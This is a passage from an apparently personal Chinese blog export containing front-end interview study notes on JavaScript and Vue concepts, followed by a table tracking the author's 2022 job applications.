color="#FF8C00">堆比栈空间大，栈比堆运行速度快</font>。</li><li><font color="#FF8C00">堆内存是无序存储，可以根据引用直接获取</font>。</li><li>基础数据类型比较稳定，而且相对来说占用的内存小。</li><li>引用数据类型大小是动态的，而且是无限的。</li></ul><p><font color="#7FFF00">字符串、大整数和浮点型数字不可能是存在栈中的，基本上任何语言的string类型都是存在堆中的，js中的栈内存容量也就是1M左右，但是一些base64字符串就达到了几十M</font></p><ol start="3"><li>Object.assign的理解</li></ol><p>作用：Object.assign可以实现对象的合并。<br>语法：Object.assign(target, …sources)<br>解析：</p><ul><li>Object.assign会将source里面的可枚举属性复制到target，<font color="#FF8C00">如果和target的已有属性重名，则会覆盖</font>。</li><li>后续的source会覆盖前面的source的<font color="#FF8C00">同名属性</font>。</li><li>Object.assign复制的是属性值，<font color="#FF00FF">如果属性值是一个引用类型，那么复制的其实是引用地址，就会存在引用共享的问题。</font></li></ul><ol start="4"><li>constructor的理解</li></ol><p>创建的每个函数都有一个prototype（原型）对象，这个属性是一个指针，指向一个<font color="#FF8C00">对象</font>。在默认情况下，所有原型对象都会自动获得一个constructor（构造函数）属性，这个属性是一个指向prototype属性所在函数的指针。当调用构造函数创建一个新实例后，<font color="#FF8C00">该实例的内部将包含一个指针（继承自构造函数的prototype），指向构造函数的原型对象</font>。<font color="#FF00FF">注意当将构造函数的prototype设置为等于一个以对象字面量形式创建的新对象时，constructor属性不再指向该构造函数</font>。</p><ol start="5"><li>map 和 forEach 的区别</li></ol><p>相同点：<br>都是循环遍历数组中的每一项<br>每次执行匿名函数都支持三个参数，参数分别为<font color="#FF8C00">item（当前每一项），index（索引值），arr（原数组</font>）<br><font color="#FF00FF">匿名函数中的this都是指向window</font><br>只能遍历数组</p><p>不同点：<br><font color="#FF00FF">map()会分配内存空间存储新数组并返回，forEach()不会返回数据</font>。<br><font color="#FF00FF">forEach()允许callback<font color="#FF8C00">更改</font>原始数组的元素。map()返回新的数组。</font></p><ol start="6"><li>for of 可以遍历哪些对象</li></ol><p>for..of..: 它是es6新增的一个遍历方法，但只限于<font color="#FF8C00">迭代器(iterator)</font>, 所以普通的对象用for..of遍历<br>是会报错的。</p><p>可迭代的对象：包括<font color="#FF8C00">Array, Map, Set, String, TypedArray, arguments</font>对象等等</p><ol start="7"><li> js静态类型检查</li></ol><p><font color="#FF00FF">js是动态类型语言</font><br><font color="#FF00FF">静态类型语言</font>：类型检查发生在<font color="#FF00FF">编译</font>阶段，因此除非修复错误，否则会一直编译失败<br><font color="#FF00FF">动态类型语言</font>：只有在程序<font color="#FF00FF">运行了一次</font>的时候错误才会被发现，也就是在运行时，因此即使代码中包含了会 在运行时阻止脚本正常运行的错误类型，这段代码也<font color="#FF00FF">可以通过编译</font></p><p><strong><font color="#FF00FF">js静态类型检查的方法</font></strong><br>Flow是Facebook开发和发布的一个开源的静态类型检查库，它允许你逐渐地向JavaScript代码中添加类型。<br>TypeScript是一个会编译为JavaScript的超集（尽管它看起来几乎像一种新的静态类型语言）<br>使用静态类型的<font color="#FF00FF">优势</font></p><ul><li>可以尽早发现bug和错误</li><li>减少了复杂的错误处理</li><li>将数据和行为分离</li><li>减少单元测试的数量</li><li>提供了领域建模（domain modeling）工具</li><li>帮助我们消除了一整类bug</li><li>重构时更有信心<br>使用静态类型的<font color="#FF00FF">劣势</font></li><li>代码冗长</li><li>需要花时间去掌握类型</li></ul><ol start="8"><li>indexof</li></ol><p>语法：str.indexOf(searchValue [, fromIndex])<br>参数：searchValue：要<font color="#FF8C00">被查找</font>的字符串值。<br>如果没有提供确切地提供字符串，<font color="#FF00FF">[searchValue 会被强制设置为”undefined”]</font>， 然后在当前字符串中查 找这个值。<br>举个例子：’undefined’.indexOf()将会返回0，因为undefined在位置0处被找到，但是’undefine’.indexOf()将会返回 -1 ，因为字符串’undefined’未被找到<br>fromIndex：可选<br>数字表示开始查找的位置。可以是任意整数，默认值为0。<br><font color="#FF00FF">如果fromIndex的值小于0，或者大于str.length，那么查找分别从0和str.length开始</font>。（译者 注：<font color="#FF00FF">fromIndex的值小于0，等同于为空情</font>况；fromIndex的值大于或等于str.length，那么结果 会直接返回-1。）<br>举个例子，’hello world’.indexOf(‘o’, -5)返回4，因为它是从位置0处开始查找，然后o在位置4处被找到。另一方面，’hello world’.indexOf(‘o’, 11)（或fromIndex填入任何大于11的值） 将会返回-1，因为开始查找的位置11处，已经是这个字符串的结尾了。<br>返回值：<br>查找的字符串searchValue的第一次出现的索引，如果没有找到，则返回-1。<br>若被查找的字符串<font color="#FF00FF">searchValue是一个空字符串，则返回fromIndex</font>。如果fromIndex值为空，或者fromIndex值小于被查找的字符串的长度，返回值和以下的fromIndex值一样。<br><font color="#FF00FF">如果fromIndex值大于等于字符串的长度，将会直接返回字符串的长度</font>（str.length）<br>特点：<br>1.<font color="#FF8C00">严格区分大小写</font><br>2.<font color="#FF00FF">在使用indexOf检索数组时，用‘===’去匹配，意味着会检查数据类型</font><br>9. iframe有什么优点、缺点</p><p><font color="#FF00FF">优点：</font><br>iframe能够原封不动的把嵌入的网页展现出来。<br>如果有多个网页引用iframe，那么你只需要修改iframe的内容，就可以实现调用的每一个页面内容的更改，方便快捷。<br>网页如果为了统一风格，头部和版本都是一样的，就可以写成一个页面，用iframe来嵌套，可以增加代码的可重用。<br>如果遇到加载缓慢的第三方内容如图标和广告，这些问题可以由iframe来解决。<br><font color="#FF00FF">缺点：</font><br>iframe会阻塞主页面的onload事件；<br>iframe和主页面共享连接池，而浏览器对相同域的连接有限制，所以会影响页面的并行加载。会产生很多页面，不容易管理。<br>iframe框架结构有时会让人感到迷惑，如果框架个数多的话，可能会出现上下、左右滚动条，会分散访问者的注意力，用户体验度差。<br>代码复杂，无法被一些搜索引擎索引到，这一点很关键，现在的搜索引擎爬虫还不能很好的处理iframe中的内容，所以<font color="#FF00FF">使用iframe会不利于搜索引擎优化（SEO</font>）。<br>很多的移动设备无法完全显示框架，设备兼容性差。<br>iframe框架页面会增加服务器的http请求，对于大型网站是不可取的。<br>10. webComponents</p><p>Web Components 总的来说是<font color="#FF8C00">提供一整套完善的封装机制来把 Web 组件化这个东西标准化，每个框架实现 的组件都统一标准地进行输入输出</font>，这样可以更好推动组件的复用</p><p>包含四个部分<br>1.Custom Elements<br>2. HTML Imports<br>3. HTML Templates<br>4. Shadow DOM</p><p>Custom Elements<br>提供一种方式让开发者可以自定义 HTML 元素，<font color="#FF8C00">包括特定的组成，样式和行为</font>。支持 Web Components 标准的浏览器会提供一系列 <font color="#FF8C00">API 给开发者用于创建自定义的元素，或者扩展现有元素</font>。</p><p>HTML Imports<br>一种在 HTMLs 中引用以及复用其他的 HTML 文档的方式。这个 Import 很漂亮，可以简单理解为我们常见 的模板中的include之类的作用</p><p>HTML Templates<br>模板</p><p>Shadow DOM<br><font color="#FF00FF">提供一种更好地组织页面元素的方式，来为日趋复杂的页面应用提供强大支持，避免代码间的相互影响</font></p><ol start="11"><li>dva的数据流流向是怎么样的</li></ol><p><font color="#FF00FF">数据的改变发生通常是通过用户交互行为或者浏览器行为（如路由跳转等）触发的，当此类行为会改变数据 的时候可以通过dispatch发起一个 action，如果是同步行为会直接通过Reducers改变State，如果是 异步行为（副作用）会先触发Effects然后流向Reducers最终改变State</font>，所以在 dva 中，数据流向非 常清晰简明，并且思路基本跟开源社区保持一致。</p><p><img src="https://files.shanqianche.cn/20227/1658851743351.png" alt="DVA"></p><ol start="12"><li>变量提升</li></ol><p>JavaScript是单线程语言，所以执行肯定是按顺序执行。但是并不是逐行的分析和执行，而是一段一段地分析执行，会先进行编译阶段然后才是执行阶段。<font color="#FF00FF">在编译阶段阶段，代码真正执行前的几毫秒，会检测到所有的变量和函数声明，所有这些函数和变量声明都被添加到名为Lexical Environment的JavaScript数据结构内的内存中</font>。所以这些变量和函数能在它们真正被声明之前使用。</p><ol start="13"><li>作用域</li></ol><p>概念：作用域就是一个独立的地盘，让变量不会外泄、暴露出去。也就是说作用域最大的用处就是隔离变量，不同作用域下同名变量不会有冲突。</p><p><font color="#FF8C00">ES6 之前 JavaScript 没有块级作用域,只有全局作用域和函数作用域</font>。ES6 的到来，为我们提供了‘块级作用域’,可通过新增命令 let 和 const 来体现。</p><p>扩展：<br>var ——ES5 变量声明方式<br>在变量未赋值时，变量undefined（为使用声明变量时也为undefined）<br>作用域——var的作用域为方法作用域；只要在方法内定义了，整个方法内的定义变量后的代码都可以使用<br>let——ES6变量声明方式</p><p>在变量为声明前直接使用会报错<br>作用域——let为块作用域——通常let比var 范围要小<br>let禁止重复声明变量，否则会报错；var可以重复声明<br>const——ES6变量声明方式<br>const为常量声明方式；声明变量时必须初始化，在后面出现的代码中不能再修改该常量的值<br>const实际上保证的，并不是变量的值不得改动，而是<font color="#FF8C00">变量指向的那个内存地址不得改动</font></p><p>14 HashMap 和 Array 有什么区别？</p><p>查找效率<br>HashMap因为其根据hashcode的值直接算出index,所以其查找效率是<font color="#FF00FF">随着数组长度增大而增加的</font>。<br>ArrayMap使用的是<font color="#FF00FF">二分法查找</font>，所以当数组长度每增加一倍时，就需要多进行一次判断，效率下降</p><p>扩容数量<br>HashMap初始值16个长度，每次扩容的时候，<font color="#FF00FF">直接申请双倍</font>的数组空间。<br>ArrayMap每次扩容的时候，<font color="#FF00FF">如果size长度大于8时申请size*1.5个长度，大于4小于8时申请8个，小于4时申 请4个。</font>这样比较ArrayMap其实是申请了更少的内存空间，但是扩容的频率会更高。因此，<font color="#FF8C00">如果数据量比较大的时候，还是使用HashMap更合适，因为其扩容的次数要比ArrayMap少很多。</font></p><p>扩容效率<br><font color="#FF00FF">HashMap每次扩容的时候重新计算每个数组成员的位置，然后放到新的位置</font>。<br>ArrayMap则是直接使用System.arraycopy，所以效率<font color="#FF8C00">上肯定是ArrayMap更占优势</font>。</p><p>内存消耗<br><font color="#FF00FF">以ArrayMap采用了一种独特的方式，能够重复的利用因为数据扩容而遗留下来的数组空间，方便下一个ArrayMap的使用。而HashMap没有这种设计。 由于ArrayMap之缓存了长度是4和8的时候，所以如果频繁的使用到Map，而且数据量都比较小的时候，ArrayMap无疑是相当的是节省内存的</font>。</p><p>总结<br><font color="#FF8C00">综上所述，数据量比较小，并且需要频繁的使用Map存储数据的时候，推荐使用ArrayMap。 而数据量比较大的 时候，则推荐使用HashMap</font>。</p><ol start="15"><li>HashMap和Object</li></ol><p>Objects和Maps类似的是，它们都允许你按键存取一个值、删除键、检测一个键是否绑定了值。因此（并且也没有其他内建的替代方式了）过去我们一直都把对象当成Maps使用。不过Maps和Objects有一些重要的区别，在下列情况里使用Map会是更好的选择：</p><table><thead><tr><th></th><th>Map</th><th>Object</th></tr></thead><tbody><tr><td>意外的键</td><td>Map默认情况不包含任何键。只包含显式插入的键。</td><td>一个Object有一个原型, 原型链上的键名有可能和你自己在对象上的设置的键名产生冲突。注意: 虽然 ES5 开始可以用Object.create(null)来创建一个没有原型的对象，但是这种用法不太常见。</td></tr><tr><td>键的类型</td><td>一个Map的键可以是任意值，包括函数、对象或任意基本类型。</td><td>一个Object的键必须是一个 String 或是Symbol。</td></tr><tr><td>键的顺序</td><td>Map中的 key 是有序的。因此，当迭代的时候，一个Map对象以插入的顺序返回键值。</td><td>一个Object的键是无序的注意：自ECMAScript 2015规范以来，对象确实保留了字符串和Symbol键的创建顺序； <font color="#FF8C00">因此，在只有字符串键的对象上进行迭代将按插入顺序产生键。</font></td></tr><tr><td>Size</td><td>Map的键值对个数可以轻易地通过size 属性获取</td><td>Object的键值对个数只能手动计算</td></tr><tr><td>迭代</td><td>Map是 iterable 的，所以可以直接被迭代。</td><td>迭代一个Object需要以某种方式获取它的键然后才能迭代。</td></tr><tr><td>性能</td><td>在频繁增删键值对的场景下表现更好。</td><td>在频繁添加和删除键值对的场景下未作出优化。</td></tr><tr><td>16. javascript中arguments相关的问题</td><td></td><td></td></tr></tbody></table><p>在js中，我们在调用有参数的函数时，当往这个调用的有参函数传参时，js会把所传的参数全部存到一个叫arguments的对象里面。它是一个类数组数据</p><p>Javascrip中<font color="#FF8C00">每个函数都会有一个Arguments对象实例arguments</font>，引用着函数的实参。它是寄生在js函数当中的，不能显式创建，arguments对象只有函数<font color="#FF8C00">开始时才可用</font></p><p>有了arguments这个对象之后，<font color="#FF8C00">我们可以不用给函数预先设定形参了，可以动态地通过arguments为函数加入参数</font></p><ol start="17"><li>instanceOf 原理，手动实现 function isInstanceOf (child, Parent)</li></ol><p>instanceof主要作用就是判断一个实例是否属于某种类型</p><p><img src="https://files.shanqianche.cn/20227/1658939783723.png" alt="依据"></p><p><img src="https://files.shanqianche.cn/20227/1658939874145.png" alt="JS原始"></p><p><img src="https://files.shanqianche.cn/20227/1658939913253.png" alt="复现instanceOf"><br>18. 去重，用filter即可，完全去重</p><p><img src="http://files.shanqianche.cn/20228/code.png" alt="完全去重"></p><p><img src="http://files.shanqianche.cn/20228/code.png" alt="完全去重"></p><ol start="19"><li>编码和字符集的区别</li></ol><p>字符集是书写系统字母与符号的集合，而字符编码则是将字符映射为一特定的字节或字节序列，是一种规则。通常特定的字符集采用特定的编码方式（即一种字符集对应一种字符编码（例如：ASCII、IOS-8859-1、GB2312、GBK，都是即表示了字符集又表示了对应的字符编码，但Unicode不是，它采用现代的模型））</p><p>扩展：<br><font color="#FF00FF">字符：</font>在计算机和电信技术中，一个字符是一个单位的字形、类字形单位或符号的基本信息。即一个字符可以是一个中文汉字、一个英文字母、一个阿拉伯数字、一个标点符号等。<br><font color="#FF00FF">字符集</font>：多个字符的集合。例如GB2312是中国国家标准的简体中文字符集，GB2312收录简化汉字（6763个）及一般符号、序号、数字、拉丁字母、日文假名、希腊字母、俄文字母、汉语拼音符号、汉语注音字母，共 7445 个图形字符。<br><font color="#FF00FF">字符编码</font>：把字符集中的字符编码为（映射）指定集合中的某一对象（例如：比特模式、自然数序列、电脉冲），以便文本在计算机中存储和通过通信网络的传递。</p><ol start="20"><li>null 和 undefined 的区别，如何让一个属性变为null</li></ol><p>undefined 表示一个变量自然的、最原始的状态值，而 null 则表示一个变量被人为的设置为空对象，而不是原始状态。所以，在实际使用过程中，为了保证变量所代表的语义，不要对一个变量显式的赋值 undefined，当需要释放一个对象时，直接赋值为 null 即可。<br>解析：<br>undefined 的字面意思就是：<font color="#FF8C00">未定义的值 </font>。这个值的语义是，希望<font color="#FF8C00">表示一个变量最原始的状态，而非人为操作的结果</font> 。 这种原始状态会在以下 4 种场景中出现：</p><ul><li>声明了一个变量，但没有赋值</li><li>访问对象上不存在的属性</li><li>函数定义了形参，但没有传递实参</li><li>使用 void 对表达式求值<br>因此，<font color="#FF00FF">undefined </font>一般都来自于某个表达式最原始的状态值，不是人为操作的结果。当然，你也可以手动给一个变量赋值 undefined，但这样做没有意义，因为一个变量不赋值就是 undefined 。<br><font color="#FF00FF">null</font> 的字面意思是：空值 。这个值的语义是，希望表示 <font color="#FF8C00">一个对象被人为的重置为空对象，而非一个变量最原始的状态</font> 。 在<font color="#FF8C00">内存里的表示就是，栈中的变量没有指向堆中的内存对象</font></li></ul><p><img src="http://files.shanqianche.cn/20228/1659408580514.png" alt="Null"><br><font color="#FF8C00">null 有属于自己的类型 Null</font>，而不属于Object类型，<font color="#FF00FF">typeof 之所以会判定为 Object 类型，是因为JavaScript 数据类型在底层都是以二进制的形式表示的，二进制的前三位为 0 会被 typeof 判断为对象类型，而 null 的二进制位恰好都是 0 ，因此，null 被误判断为 Object 类型</font>。</p><ol start="21"><li>数组和伪数组的区别</li></ol><p>数组是一个特殊对象,与常规对象的区别：</p><ul><li><font color="#FF8C00">当由新元素添加到列表中时，自动更新length属性</font></li><li><font color="#FF8C00">设置length属性，可以截断数组</font></li><li><font color="#FF8C00">从Array.protoype中继承了方法</font></li><li><font color="#FF8C00">属性为’Array’</font></li></ul><p><font color="#FF00FF">类数组是一个拥有length属性，并且他属性为<font color="#FF1493">非负整数</font>的普通对象，类数组不能直接调用数组方法。</font></p><p><strong>类数组转换为数组</strong><br>转换方法</p><ul><li>使用Array.from()</li><li>使用<font color="#FF00FF">Array.prototype.slice.call()</font></li><li>使用Array.prototype.forEach()进行属性遍历并组成新的数组<br>转换须知</li><li>转换后的数组长度由length属性决定。索引不连续时转换结果是连续的，会自动补位。</li></ul><ol start="22"><li>手写一个发布订阅</li></ol><p><a href="https://segmentfault.com/a/1190000019722065#item-2">观察者模式与发布者模式</a></p><ol start="23"><li>手写数组转树 【TODO 看书】</li></ol><p><a href="https://www.nowcoder.com/tutorial/96/24304825a0c04ea9a53cdb09cb664834">代码</a></p><ol start="24"><li>介绍下 Set、Map、WeakSet 和 WeakMap 的区别？</li></ol><p>Set</p><ul><li>成员不能重复；</li><li>只有键值，没有键名，有点类似数组；</li><li>可以遍历，方法有add、delete、has<br>WeakSet</li><li>成员都是对象（引用）；</li><li>成员都是弱引用，随时可以消失（不计入垃圾回收机制）。可以用来保存 DOM 节点，不容易造成内存泄露；</li><li>不能遍历，方法有add、delete、has；<br>Map</li><li>本质上是键值对的集合，类似集合；</li><li>可以遍历，方法很多，可以跟各种数据格式转换；<br>WeakMap</li><li>只接收对象为键名（null 除外），不接受其他类型的值作为键名；</li><li>键名指向的对象，不计入垃圾回收机制；</li><li>不能遍历，方法同get、set、has、delete；</li></ul><ol start="25"><li>简单说说 js 中有哪几种内存泄露的情况</li></ol><p>意外的全局变量；<br>闭包；<br>未被清空的定时器；<br>未被销毁的事件监听；<br>DOM 引用；</p><ol start="26"><li>异步笔试题</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">async function async1() &#123;</span><br><span class="line">  console.log(&quot;async1 start&quot;);</span><br><span class="line">  await async2();</span><br><span class="line">  console.log(&quot;async1 end&quot;);</span><br><span class="line">&#125;</span><br><span class="line">async function async2() &#123;</span><br><span class="line">  console.log(&quot;async2&quot;);</span><br><span class="line">&#125;</span><br><span class="line">console.log(&quot;script start&quot;);</span><br><span class="line">setTimeout(function () &#123;</span><br><span class="line">  console.log(&quot;settimeout&quot;);</span><br><span class="line">&#125;);</span><br><span class="line">async1();</span><br><span class="line">new Promise(function (resolve) &#123;</span><br><span class="line">  console.log(&quot;promise1&quot;);</span><br><span class="line">  resolve();</span><br><span class="line">&#125;).then(function () &#123;</span><br><span class="line">  console.log(&quot;promise2&quot;);</span><br><span class="line">&#125;);</span><br><span class="line">console.log(&quot;script end&quot;);</span><br></pre></td></tr></table></figure><p><img src="http://files.shanqianche.cn/20228/1659426027932.png" alt="结果"></p><p><a href="https://segmentfault.com/a/1190000022805523">理解</a></p><ol start="27"><li>json和xml数据的区别</li></ol><ul><li>数据体积方面：xml是重量级的，json是轻量级的，传递的速度更快些。</li><li>数据传输方面：xml在传输过程中比较占带宽，json占带宽少，易于压缩。</li><li>数据交互方面：json与javascript的交互更加方便，更容易解析处理，更好的进行数据交互</li><li>数据描述方面：json对数据的描述性比xml较差</li><li>xml和json都用在项目交互下，xml多用于做配置文件，json用于数据交互。</li></ul><ol start="28"><li>JavaScript有几种方法判断变量的类型?、</li></ol><ul><li>使用typeof检测当需要判断变量是否是number, string, boolean, function, undefined等类型时，可以使用typeof进行判断。</li><li>使用instanceof检测instanceof运算符与typeof运算符相似，用于识别正在处理的对象的类型。<font color="#FF8C00">与typeof方法不同的是，instanceof 方法要求开发者明确地确认对象为某特定类型</font>。</li><li>使用constructor检测constructor本来是原型对象上的属性，指向构造函数。但是根据实例对象寻找属性的顺序，若实例对象上没有实例属性或方法时，就去<font color="#FF8C00">原型链上</font>寻找，因此，实例对象也是能使用constructor属性的。</li></ul><ol start="29"><li>代码解释题</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">var min = Math.min();</span><br><span class="line">max = Math.max();</span><br><span class="line">console.log(min &lt; max);</span><br><span class="line">// 写出执行结果，并解释原因</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>答案<br>false<br><strong>解析</strong></p><ul><li>按常规的思路，这段代码应该输出 true，毕竟最小值小于最大值。但是却输出 false</li><li>MDN 相关文档是这样解释的</li><li><ul><li>Math.min 的参数是 0 个或者多个，如果多个参数很容易理解，返回参数中最小的。如果没有参数，<font color="#FF00FF">则返回 Infinity，无穷大</font>。</li></ul></li><li><ul><li>而 Math.max <font color="#FF00FF">没有传递参数时返回的是-Infinity</font>.所以输出 false</li></ul></li></ul><ol start="30"><li>代码解析题</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">var company = &#123;</span><br><span class="line">    address: &#x27;beijing&#x27;</span><br><span class="line">&#125;</span><br><span class="line">var yideng = Object.create(company); //&#123;&#125;</span><br><span class="line">delete yideng.address</span><br><span class="line">console.log(yideng.address);</span><br><span class="line">// 写出执行结果，并解释原因</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>答案<br>beijing<br><strong>解析</strong><br>这里的 yideng为{}空对象， 通过 prototype 继承了 company的 address。<font color="#FF00FF">yideng自己并没有address属性</font>。所以delete操作符的作用是无效的。<br><strong>扩展</strong><br>1.delete使用原则：delete 操作符用来删除一个对象的属性。<br>2.delete在删除一个不可配置的属性时在严格模式和非严格模式下的区别:<br>（1）在严格模式中，如果属性是一个不可配置（non-configurable）属性，删除时会抛出异常;<br>（2）非严格模式下返回 false。<br>3.delete<font color="#FF00FF">能删除隐式声明的全局变量</font>：这个全局变量其实是global对象(window)的属性<br>4.delete<font color="#FF8C00">能删除</font>的：<br>（1）可配置对象的属性（2）隐式声明的全局变量 （3）用户定义的属性 （4）在ECMAScript 6中，通过 const 或 let 声明指定的 “temporal dead zone” (TDZ) 对 delete 操作符也会起作用<br>delete<font color="#FF8C00">不能删除</font>的：<br>（2）显式声明的全局变量 （2）内置对象的内置属性 （3）一个对象从原型继承而来的属性<br>5.delete删除数组元素：<br>（1）当你删除一个数组元素时，<font color="#FF00FF">数组的 length 属性并不会变小，数组元素变成undefined</font><br>（2）当用 delete 操作符删除一个数组元素时，<font color="#FF8C00">被删除的元素已经完全不属于该数组</font>。<br>（3）如果你想让一个数组元素的值变为 undefined 而不是删除它，可以使用 undefined 给其赋值而不是使用 delete 操作符。此时数组元素是在数组中的<br>6.delete <font color="#FF00FF">操作符与直接释放内存（只能通过解除引用来间接释放）没有关系。</font></p>]]></content>
      
      
      <categories>
          
          <category> plan </category>
          
      </categories>
      
      
        <tags>
            
            <tag> daily </tag>
            
            <tag> graduate student </tag>
            
            <tag> study </tag>
            
            <tag> plan </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2022-7-22几道前端面经</title>
      <link href="/2022/07/22/2022-7-22%E5%87%A0%E9%81%93%E5%89%8D%E7%AB%AF%E9%9D%A2%E7%BB%8F/"/>
      <url>/2022/07/22/2022-7-22%E5%87%A0%E9%81%93%E5%89%8D%E7%AB%AF%E9%9D%A2%E7%BB%8F/</url>
      
        <content type="html"><![CDATA[<ol><li>vue钩子函数</li></ol><p>beforeCreate、created、beforeMounted、mounted beforeUpdate、updated 、 beforeDestroy、destroyed 标准回答 钩子函数用来描述一个组件从引入到退出的全过程中的某个过程，整个过程称为生命周期。 钩子函数按照组件生命周期的过程分为，<font color="#FF00FF">挂载阶段=&gt;更新阶段=&gt;销毁阶段</font>。<br>每个阶段对应的钩子函数 <font color="#7FFF00">挂载阶段</font>：beforeCreate、created、beforeMounted、mounted <font color="#7FFF00">更新阶段</font>：beforeUpdate、updated <font color="#7FFF00">销毁阶段</font>：beforeDestroy、destroyed<br><strong>每个阶段特点与适合做什么 ：</strong><br><font color="#ff7500">beforeCreate</font>实例创建之前执行<br><font color="#ff7500">created</font>：实例创建完成，可访问data、computed、watch、methods上的方法和数据，未挂载到DOM，不能访问到el属性，如果要进行dom操作，那就要用nextTick函数<br><font color="#ff7500">beforeMount</font>：在挂载开始之前被调用，beforeMount之前，会找到对应的template，并编译成render函数<br><font color="#ff7500">mounted：</font>实例挂载到DOM上，此时可以通过DOM API获取到DOM节点，$ref属性可以访问常用于获取VNode信息和操作，<br><font color="#ff7500">beforeupdate：</font>响应式数据更新时调用，发生在虚拟DOM打补丁之前，适合在更新之前访问现有的DOM，比如手动移除已添加的事件监听器<br><font color="#ff7500">updated：</font>虚拟 DOM 重新渲染和打补丁之后调用，组件DOM已经更新，可执行依赖于DOM的操作避免在这个钩子函数中操作数据，可能陷入死循环<br><font color="#ff7500">beforeDestroy：</font>实例销毁之前调用。这一步，实例仍然完全可用，this仍能获取到实例，常用于销毁定时器、解绑全局事件、销毁插件对象等操作<br><font color="#ff7500">deStroyed：</font>实例销毁之后调用。<br><font color="#DC143C">加分回答 </font>父子组件钩子函数在三个阶段的代码执行顺序 挂载：父亲created&gt; 子created &gt; 子mounted&gt; 父亲mounted&gt;<br>更新：父亲beforeUpdate &gt; 子beforeUpdated &gt; 子updated &gt; 父亲updated<br>销毁：父亲beforeDestroy&gt; 子beforeDestroy &gt; 子destroyed&gt; 父destroyed<br>2. 事件扩展符，使用场景下</p><p><a href="https://blog.csdn.net/xiaosen207/article/details/123323441">事件扩展符</a></p><ol start="3"><li>服务端渲染</li></ol>]]></content>
      
      
      <categories>
          
          <category> plan </category>
          
      </categories>
      
      
        <tags>
            
            <tag> daily </tag>
            
            <tag> graduate student </tag>
            
            <tag> study </tag>
            
            <tag> plan </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>找工作</title>
      <link href="/2022/07/22/%E6%89%BE%E5%B7%A5%E4%BD%9C/"/>
      <url>/2022/07/22/%E6%89%BE%E5%B7%A5%E4%BD%9C/</url>
      
        <content type="html"><![CDATA[<table><thead><tr><th>company</th><th>base</th><th>类型</th><th>进度</th><th>简历筛选</th><th>评测</th><th>笔试</th><th>面试</th><th></th><th></th></tr></thead><tbody><tr><td>字节跳动–飞书</td><td>北京</td><td>提前</td><td>7.22-</td><td>g</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>OPPO</td><td>深圳</td><td>提前</td><td></td><td>g</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>联想</td><td></td><td>提前</td><td></td><td>g</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>蔚来-自动驾驶</td><td>北京</td><td>提前</td><td>7.26</td><td>g</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>搜狐</td><td>北京</td><td>正式</td><td>7.26</td><td>g</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>墨奇科技</td><td>成都</td><td>正式</td><td>7.27</td><td>0</td><td></td><td></td><td></td><td></td><td>牛客上投</td></tr><tr><td>旷视</td><td>北京</td><td>提前</td><td>7.27-</td><td>pending</td><td></td><td></td><td></td><td></td><td><a href="https://www.nowcoder.com/discuss/995610?type=all&order=recall&pos=&page=1&ncTraceId=&channel=-1&source_id=search_all_nctrack&gio_id=616D3348D7B7853881972116C05A455F-1658913333687">内推</a></td></tr><tr><td>用友</td><td>北京</td><td>正式</td><td>7-27</td><td></td><td></td><td></td><td></td><td></td><td>牛客上投</td></tr><tr><td>猿辅导</td><td>北京</td><td></td><td>7-28</td><td>pending</td><td></td><td>done</td><td></td><td></td><td></td></tr><tr><td>森汉科技</td><td>北京</td><td></td><td>7-28</td><td>g</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>网易互娱</td><td>广州</td><td></td><td>7.28-29</td><td>1</td><td></td><td></td><td></td><td></td><td>官网，牛客内推</td></tr><tr><td>网易雷火</td><td>杭州</td><td></td><td>7-28</td><td></td><td></td><td></td><td></td><td></td><td>官网</td></tr><tr><td>北森</td><td>北京</td><td></td><td>7.28-29-31</td><td>1</td><td>done</td><td></td><td></td><td></td><td>牛客</td></tr><tr><td>东方财富</td><td>上海</td><td>提前</td><td>7.29-29-31</td><td>1</td><td>done</td><td></td><td></td><td></td><td>牛客</td></tr><tr><td>旷视</td><td>北京</td><td>正式</td><td>7.30</td><td>pending</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>一点资讯</td><td>北京</td><td>正式</td><td>7.30</td><td>0</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>竞技世界</td><td>北京</td><td>正式</td><td>7.30</td><td>g</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>极智嘉Geek+</td><td>苏州</td><td>正式</td><td>7.30</td><td>g</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>远景</td><td></td><td></td><td>8.1</td><td>1</td><td>done</td><td></td><td></td><td></td><td></td></tr><tr><td>大疆</td><td></td><td></td><td>8.1</td><td>1</td><td>done</td><td>done</td><td></td><td></td><td></td></tr><tr><td>同盾</td><td></td><td></td><td></td><td>pending</td><td></td><td>done</td><td>0</td><td></td><td></td></tr><tr><td>作业帮</td><td>北京</td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>上海爱数</td><td></td><td></td><td></td><td>1</td><td></td><td>1</td><td></td><td></td><td>牛客</td></tr><tr><td>内蒙古钛驰新迪商务有限公司</td><td></td><td></td><td></td><td>0</td><td></td><td></td><td></td><td></td><td>牛客</td></tr>